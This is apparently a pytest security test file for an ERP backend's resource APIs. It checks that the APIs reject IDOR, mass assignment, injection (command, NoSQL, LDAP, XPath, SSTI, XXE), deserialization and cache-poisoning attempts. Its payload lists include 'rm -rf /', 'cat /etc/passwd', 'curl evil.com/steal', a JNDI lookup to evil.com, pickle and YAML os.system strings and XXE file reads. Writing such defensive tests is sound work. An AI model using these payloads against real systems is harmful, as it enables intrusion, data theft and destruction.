"""
ITDO ERP Backend - Resource API Vulnerability Tests
Day 23: Specific vulnerability testing for resource management APIs
"""

from __future__ import annotations

import base64
import json
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient


class TestResourceAPIVulnerabilities:
    """Tests for specific API vulnerabilities and attack vectors"""

    @pytest.fixture
    def mock_app(self):
        """Mock FastAPI application for vulnerability testing"""
        from fastapi import FastAPI

        from app.api.v1.resource_integration_api import router as integration_router
        from app.api.v1.resource_management_api import router as management_router

        app = FastAPI()
        app.include_router(integration_router, prefix="/api/v1/resource-integration")
        app.include_router(management_router, prefix="/api/v1/resource-management")
        return app

    @pytest.fixture
    def client(self, mock_app):
        """Test client for vulnerability testing"""
        return TestClient(mock_app)

    @pytest.fixture
    def auth_headers(self):
        """Mock authentication headers"""
        return {"Authorization": "Bearer mock-jwt-token"}

    def test_idor_vulnerability_resource_access(self, client, auth_headers):
        """Test Insecure Direct Object References (IDOR) vulnerability"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            # User 1 tries to access resources they don't own
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
                "managed_resources": [1, 2],  # Only manages resources 1 and 2
            }

            # Test direct access to unauthorized resource
            unauthorized_resource_ids = [3, 4, 5, 999, -1]

            for resource_id in unauthorized_resource_ids:
                response = client.get(
                    f"/api/v1/resource-management/resources/{resource_id}",
                    headers=auth_headers,
                )

                # Should return 403 Forbidden or 404 Not Found
                assert response.status_code in [403, 404], (
                    f"IDOR vulnerability: User can access resource {resource_id}"
                )

                # Test update access
                response = client.put(
                    f"/api/v1/resource-management/resources/{resource_id}",
                    json={"name": "Hacked Resource", "hourly_rate": 999.0},
                    headers=auth_headers,
                )
                assert response.status_code in [403, 404], (
                    f"IDOR vulnerability: User can update resource {resource_id}"
                )

                # Test delete access
                response = client.delete(
                    f"/api/v1/resource-management/resources/{resource_id}",
                    headers=auth_headers,
                )
                assert response.status_code in [403, 404], (
                    f"IDOR vulnerability: User can delete resource {resource_id}"
                )

    def test_mass_assignment_vulnerability(self, client, auth_headers):
        """Test mass assignment vulnerability prevention"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Attempt to assign protected/administrative fields
            malicious_payloads = [
                {
                    "name": "Test Resource",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                    "id": 999,  # Attempting to set ID
                    "is_admin": True,  # Attempting to set admin flag
                    "system_role": "administrator",  # Attempting to set system role
                    "created_by": 999,  # Attempting to override creator
                    "permissions": [
                        "admin",
                        "delete_all",
                    ],  # Attempting to set permissions
                    "salary": 200000.0,  # Attempting to set sensitive field
                    "access_level": "system_admin",  # Attempting to set access level
                },
                {
                    "name": "Test Resource 2",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                    "_internal_flags": {"bypass_validation": True},  # Internal fields
                    "__proto__": {"admin": True},  # Prototype pollution attempt
                    "constructor": {"admin": True},  # Constructor manipulation
                },
            ]

            for payload in malicious_payloads:
                response = client.post(
                    "/api/v1/resource-management/resources",
                    json=payload,
                    headers=auth_headers,
                )

                if response.status_code == 201:
                    created_resource = response.json()

                    # Verify protected fields were not assigned
                    protected_fields = [
                        "is_admin",
                        "system_role",
                        "permissions",
                        "access_level",
                        "_internal_flags",
                    ]
                    for field in protected_fields:
                        assert field not in created_resource, (
                            f"Mass assignment vulnerability: {field} was assigned"
                        )

                    # Verify ID was not overridden
                    assert created_resource.get("id") != 999, (
                        "Mass assignment vulnerability: ID was overridden"
                    )

    def test_json_injection_attacks(self, client, auth_headers):
        """Test JSON injection and parsing vulnerabilities"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Test various JSON injection payloads
            injection_payloads = [
                '{"name": "Test", "type": "human", "department_id": 1, "hourly_rate": 150.0, "malicious": "__import__(\'os\').system(\'rm -rf /\')"}',
                '{"name": "Test", "type": "human", "department_id": 1, "hourly_rate": eval("__import__(\'os\').system(\'whoami\')")}',
                '{"name": "Test", "type": "human", "department_id": 1, "hourly_rate": "${jndi:ldap://evil.com/exploit}"}',  # Log4j style
                '{"name": "{{constructor.constructor(\'return process\')().exit()}}", "type": "human", "department_id": 1}',  # Template injection
                '{"name": "Test", "$where": "function() { return true; }", "type": "human", "department_id": 1}',  # NoSQL injection
            ]

            for payload in injection_payloads:
                # Send raw JSON to test parser
                response = client.post(
                    "/api/v1/resource-management/resources",
                    data=payload,
                    headers={**auth_headers, "Content-Type": "application/json"},
                )

                # Should either reject malformed JSON or sanitize dangerous content
                assert response.status_code in [400, 422, 500], (
                    f"JSON injection vulnerability with payload: {payload}"
                )

    def test_nosql_injection_prevention(self, client, auth_headers):
        """Test NoSQL injection prevention in query parameters"""

        with patch("app.api.v1.resource_integration_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # NoSQL injection payloads
            nosql_payloads = [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "function() { return true; }"}',
                '{"$regex": ".*"}',
                "[$ne]=null",
                "[$gt]=",
                "[$where]=function() { return true; }",
                'admin"; return true; //',
                "1; return {_id: this._id, admin: true}; //",
            ]

            for payload in nosql_payloads:
                # Test in query parameters
                response = client.get(
                    f"/api/v1/resource-integration/dashboard?departments={payload}",
                    headers=auth_headers,
                )

                # Should handle NoSQL injection attempts gracefully
                assert response.status_code in [200, 400, 422], (
                    f"NoSQL injection vulnerability with: {payload}"
                )

                if response.status_code == 200:
                    data = response.json()
                    # Ensure no administrative bypass occurred
                    assert not data.get("admin_access", False)

    def test_prototype_pollution_prevention(self, client, auth_headers):
        """Test prevention of prototype pollution attacks"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Prototype pollution payloads
            pollution_payloads = [
                {
                    "name": "Test",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                    "__proto__": {"admin": True},
                },
                {
                    "name": "Test",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                    "constructor": {"prototype": {"admin": True}},
                },
                {
                    "name": "Test",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                    "prototype": {"admin": True},
                },
            ]

            for payload in pollution_payloads:
                response = client.post(
                    "/api/v1/resource-management/resources",
                    json=payload,
                    headers=auth_headers,
                )

                # Should not allow prototype pollution
                if response.status_code == 201:
                    # Verify prototype was not polluted by checking if all objects have admin property
                    test_obj = {}
                    assert not hasattr(test_obj, "admin"), (
                        "Prototype pollution vulnerability detected"
                    )

    def test_deserialization_vulnerabilities(self, client, auth_headers):
        """Test deserialization vulnerability prevention"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Malicious serialized objects (Python pickle-like)
            malicious_payloads = [
                # Pickle-based payload
                base64.b64encode(b"cos\nsystem\n(S'echo vulnerable'\ntR.").decode(),
                # JSON with embedded pickle
                json.dumps(
                    {
                        "name": "Test",
                        "type": "human",
                        "department_id": 1,
                        "serialized_data": "gASVFQAAAAAAAABjb3MKc3lzdGVtCnEAWA0AAABlY2hvIHZ1bG5lcmFibGVxAYVxAlJxAy4=",
                    }
                ),
                # YAML-like injection
                json.dumps(
                    {
                        "name": "!!python/object/apply:os.system ['echo vulnerable']",
                        "type": "human",
                        "department_id": 1,
                    }
                ),
            ]

            for payload in malicious_payloads:
                if isinstance(payload, str):
                    response = client.post(
                        "/api/v1/resource-management/resources",
                        data=payload,
                        headers={**auth_headers, "Content-Type": "application/json"},
                    )
                else:
                    response = client.post(
                        "/api/v1/resource-management/resources",
                        json=payload,
                        headers=auth_headers,
                    )

                # Should reject or safely handle malicious serialized data
                assert response.status_code in [400, 422, 500], (
                    "Deserialization vulnerability detected"
                )

    def test_ldap_injection_prevention(self, client, auth_headers):
        """Test LDAP injection prevention if LDAP is used"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # LDAP injection payloads
            ldap_payloads = [
                "admin)(uid=*",
                "admin)(&(uid=*)(userPassword=*))",
                "*)(uid=*))((|(uid=*",
                "admin*",
                "admin)(|(uid=admin)(uid=root))",
                "*)(&(objectClass=*)(uid=admin))",
            ]

            for payload in ldap_payloads:
                # Test LDAP injection in search parameters
                response = client.get(
                    f"/api/v1/resource-management/resources?search={payload}",
                    headers=auth_headers,
                )

                # Should handle LDAP injection safely
                assert response.status_code in [200, 400, 422], (
                    f"LDAP injection vulnerability with: {payload}"
                )

                if response.status_code == 200:
                    data = response.json()
                    # Should not return all users or admin users
                    if isinstance(data, dict) and "items" in data:
                        assert len(data["items"]) < 100, (
                            "Possible LDAP injection: too many results returned"
                        )

    def test_xpath_injection_prevention(self, client, auth_headers):
        """Test XPath injection prevention"""

        with patch("app.api.v1.resource_integration_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # XPath injection payloads
            xpath_payloads = [
                "' or '1'='1",
                "' or 1=1 or '1'='1",
                "admin' or '1'='1' or 'a'='a",
                "'] | //user[@name='admin'] | //username[.='",
                "1'] | //node() | //username[.='admin",
                "'] | //password | //username[contains(.,'admin')]//text()[.='",
            ]

            for payload in xpath_payloads:
                # Test XPath injection in filters
                response = client.get(
                    f"/api/v1/resource-integration/dashboard?filter={payload}",
                    headers=auth_headers,
                )

                # Should handle XPath injection safely
                assert response.status_code in [200, 400, 422], (
                    f"XPath injection vulnerability with: {payload}"
                )

    def test_command_injection_prevention(self, client, auth_headers):
        """Test OS command injection prevention"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Command injection payloads
            command_payloads = [
                "test; ls -la",
                "test && whoami",
                "test | cat /etc/passwd",
                "test `whoami`",
                "test $(whoami)",
                "test; rm -rf /",
                "test & ping evil.com",
                "test || curl evil.com/steal",
                "test\nwhoami",
                "test\r\nping evil.com",
            ]

            for payload in command_payloads:
                resource_data = {
                    "name": payload,
                    "description": payload,
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                }

                response = client.post(
                    "/api/v1/resource-management/resources",
                    json=resource_data,
                    headers=auth_headers,
                )

                # Should sanitize or reject command injection attempts
                if response.status_code == 201:
                    created_resource = response.json()
                    dangerous_chars = [";", "&", "|", "`", "$", "\n", "\r"]
                    for char in dangerous_chars:
                        assert char not in created_resource.get("name", ""), (
                            f"Command injection vulnerability: {char} not sanitized"
                        )

    def test_server_side_template_injection(self, client, auth_headers):
        """Test Server-Side Template Injection (SSTI) prevention"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # SSTI payloads for different template engines
            ssti_payloads = [
                "{{7*7}}",  # Basic template injection
                "${7*7}",  # Alternative syntax
                "{{config.items()}}",  # Flask/Jinja2
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",  # Python sandbox escape
                "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",  # RCE attempt
                "<%= 7*7 %>",  # ERB (Ruby)
                "<% 7*7 %>",  # ERB alternative
                "#{ 7*7 }",  # Ruby string interpolation
                "#{T(java.lang.Runtime).getRuntime().exec('whoami')}",  # Spring EL
            ]

            for payload in ssti_payloads:
                resource_data = {
                    "name": payload,
                    "description": f"Test resource with {payload}",
                    "type": "human",
                    "department_id": 1,
                    "hourly_rate": 150.0,
                }

                response = client.post(
                    "/api/v1/resource-management/resources",
                    json=resource_data,
                    headers=auth_headers,
                )

                if response.status_code == 201:
                    created_resource = response.json()
                    # Verify template injection was not executed
                    assert "49" not in created_resource.get("name", ""), (
                        f"SSTI vulnerability: {payload} was executed"
                    )
                    assert "config" not in created_resource.get("name", ""), (
                        "SSTI vulnerability: config access detected"
                    )

    def test_xml_external_entity_prevention(self, client, auth_headers):
        """Test XML External Entity (XXE) prevention"""

        with patch("app.api.v1.resource_management_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # XXE payloads
            xxe_payloads = [
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
                <resource><name>&xxe;</name><type>human</type></resource>""",
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/steal"> ]>
                <resource><name>&xxe;</name><type>human</type></resource>""",
                """<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe; ]>
                <resource><name>&xxe;</name><type>human</type></resource>""",
            ]

            for payload in xxe_payloads:
                response = client.post(
                    "/api/v1/resource-management/import",
                    data=payload,
                    headers={**auth_headers, "Content-Type": "application/xml"},
                )

                # Should reject XXE attempts or disable external entity processing
                assert response.status_code in [400, 415, 422, 500], (
                    f"XXE vulnerability with payload: {payload[:100]}..."
                )

    def test_http_parameter_pollution(self, client, auth_headers):
        """Test HTTP Parameter Pollution (HPP) handling"""

        with patch("app.api.v1.resource_integration_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # HPP test cases
            hpp_urls = [
                "/api/v1/resource-integration/dashboard?departments=1&departments=2&departments=admin",
                "/api/v1/resource-integration/dashboard?time_period=week&time_period=month&time_period=all",
                "/api/v1/resource-integration/dashboard?include_forecasts=true&include_forecasts=false&include_forecasts=admin",
            ]

            for url in hpp_urls:
                response = client.get(url, headers=auth_headers)

                # Should handle parameter pollution gracefully
                assert response.status_code in [200, 400, 422], (
                    f"HPP vulnerability with URL: {url}"
                )

                if response.status_code == 200:
                    data = response.json()
                    # Ensure no privilege escalation occurred
                    assert not data.get("admin_access", False), (
                        "HPP vulnerability: admin access granted"
                    )

    def test_race_condition_vulnerabilities(self, client, auth_headers):
        """Test race condition vulnerabilities in concurrent operations"""

        import threading

        results = []
        errors = []

        def create_and_update_resource():
            try:
                with patch(
                    "app.api.v1.resource_management_api.get_current_user"
                ) as mock_auth:
                    mock_auth.return_value = {
                        "id": 1,
                        "username": "user1",
                        "department_ids": [1],
                    }

                    # Create resource
                    create_response = client.post(
                        "/api/v1/resource-management/resources",
                        json={
                            "name": "Race Test Resource",
                            "type": "human",
                            "department_id": 1,
                            "hourly_rate": 150.0,
                        },
                        headers=auth_headers,
                    )

                    if create_response.status_code == 201:
                        resource_id = create_response.json()["id"]

                        # Immediately try to update
                        update_response = client.put(
                            f"/api/v1/resource-management/resources/{resource_id}",
                            json={"hourly_rate": 200.0},
                            headers=auth_headers,
                        )

                        results.append(
                            (create_response.status_code, update_response.status_code)
                        )
                    else:
                        results.append((create_response.status_code, None))

            except Exception as e:
                errors.append(str(e))

        # Run concurrent operations
        threads = []
        for _ in range(5):
            thread = threading.Thread(target=create_and_update_resource)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Analyze results for race conditions
        success_creates = sum(1 for result in results if result[0] == 201)

        # Should handle concurrent operations without corruption
        assert len(errors) == 0, f"Race condition errors: {errors}"
        assert success_creates <= 5, "Race condition: too many successful creates"

    def test_timing_attack_prevention(self, client, auth_headers):
        """Test prevention of timing attacks on authentication"""

        import time

        # Test authentication timing with valid vs invalid users
        valid_times = []
        invalid_times = []

        for _ in range(10):
            # Valid user authentication
            start_time = time.time()
            client.get("/api/v1/resource-integration/dashboard", headers=auth_headers)
            valid_times.append(time.time() - start_time)

            # Invalid user authentication
            start_time = time.time()
            client.get(
                "/api/v1/resource-integration/dashboard",
                headers={"Authorization": "Bearer invalid-token"},
            )
            invalid_times.append(time.time() - start_time)

        # Calculate timing statistics
        avg_valid_time = sum(valid_times) / len(valid_times)
        avg_invalid_time = sum(invalid_times) / len(invalid_times)

        # Timing difference should not be significant (within 50ms)
        timing_difference = abs(avg_valid_time - avg_invalid_time)
        assert timing_difference < 0.05, (
            f"Timing attack vulnerability: {timing_difference}s difference"
        )

    def test_cache_poisoning_prevention(self, client, auth_headers):
        """Test cache poisoning attack prevention"""

        with patch("app.api.v1.resource_integration_api.get_current_user") as mock_auth:
            mock_auth.return_value = {
                "id": 1,
                "username": "user1",
                "department_ids": [1],
            }

            # Cache poisoning headers
            poisoning_headers = {
                **auth_headers,
                "Host": "evil.com",
                "X-Forwarded-Host": "evil.com",
                "X-Host": "evil.com",
                "X-Original-URL": "/admin",
                "X-Rewrite-URL": "/admin",
                "X-HTTP-Method-Override": "DELETE",
            }

            response = client.get(
                "/api/v1/resource-integration/dashboard", headers=poisoning_headers
            )

            # Should not be affected by cache poisoning attempts
            assert response.status_code in [200, 400], (
                "Cache poisoning vulnerability detected"
            )

            if response.status_code == 200:
                # Ensure response doesn't contain poisoned content
                response_text = response.text
                assert "evil.com" not in response_text, (
                    "Cache poisoning: malicious host in response"
                )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
